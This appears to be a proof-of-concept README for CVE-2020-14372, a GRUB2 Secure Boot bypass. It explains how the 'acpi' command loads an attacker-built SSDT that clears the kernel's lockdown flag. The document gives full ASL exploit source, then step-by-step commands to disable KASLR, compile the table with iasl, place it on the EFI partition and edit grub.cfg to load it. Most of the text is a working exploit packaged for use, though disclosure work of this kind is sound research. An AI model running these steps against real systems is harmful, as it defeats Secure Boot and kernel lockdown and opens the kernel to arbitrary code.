# CVE-2020-14372: Bypassing (not so) Secure Boot with one "simple trick"

## Vulnerability details

One day I typed "help" into GRUB2's console and saw some really "fun"
commands:

* read_byte ADDR:      Read 8-bit value from ADDR
* write_byte ADDR VAL: Write 8-bit value VAL to ADDR

I immediately thought I found the most fun Secure Boot bypass, but these
commands output the following under Secure Boot:
```
error: Secure Boot forbids loading module .../memrw.mod.
```

Out of curiosity, booted this way I typed the "acpi" command, and it printed
a usage message telling me to point it to an AML file. It's well-known that
another name for ACPI is a "mechanism to run arbitrary vendor provided code
in the context of your kernel", since we can load ACPI tables with Secure Boot
enabled, we are the "vendor" who can provide that code.

But since there is a one-byte flag (kernel_locked_down) in the data segment of
the booted kernel telling it whether or not its "locked down", we can just
overwrite that flag using an SSDT and let the kernel load arbitrary modules.

The following SSDT accomplishes this by creating a "battery" object called `HACK`,
and doing the write in said object's `_INI` method which is always executed by
the kernel:
```
DefinitionBlock ("trigger.aml", "SSDT", 2, "", "", 0x00001001)
{
  OperationRegion (KMEM, SystemMemory, ADDRESS_GOES_HERE, 4)
  Field (KMEM, DWordAcc, NoLock, WriteAsZeros)
  {
    LKDN, 32
  }
  Device (\_SB_.HACK)
  {
    Name(_HID, EisaId ("PNP0C0A"))
    Name(_UID, 0x02)
    Method(_INI)
    {
      If (LKDN)
      {
        LKDN = Zero
      }
    }
  }
}
```

I wrote a proof of concept exploit in Python that helps with generating this SSDT,
but exploting this by hand is not that difficult either. The rough outline is as
follows:

1. Disable KASLR by adding `nokaslr` to the kernel command line
2. Find the **physical** address of the `kernel_locked_down` symbol after booting
   without KASLR
3. Insert the address into the SSDT above, than compile that SSDT using `iasl`
4. Finally instruct GRUB2 to load the SSDT

## How to use the PoC

Assumptions:

- The attacker has `root` access to the running operating system
- Linux is booted under UEFI Secure Boot with GRUB2 version <=2.02
  (some builds of 2.02 are patched), this will cause kernel lockdown to be enabled

When the above assumptions are met, edit `/etc/default/grub`, add `nokaslr`
to `GRUB_CMDLINE_LINUX_DEFAULT`, run `update-grub`, and then finally reboot.

After the kernel is booted without address space layout randomization, the
`genssdt.py` script can be used to generate a "malicious" SSDT that will patch
the kernel's memory at runtime to disable lockdown:

```
python3 genssdt.py > trigger.dsl
iasl trigger.dsl
cp trigger.aml /boot/efi/evil_ssdt.aml
```

Now that the SSDT was created, the GRUB configuration file
(usually at `/boot/grub/grub.cfg`) must be edited to make GRUB load this SSDT
(adding this to the top of this file):

```
acpi (hd0,gpt1)/evil_ssdt.aml
```

Based on where the EFI system partition (where we placed the SSDT above) resides
on disk, `(hd0,gpt1)` might need to be replaced with something else.

Finally after a reboot, kernel lockdown should be disabled, giving `root` the
ability to execute arbitrary code in the kernel.
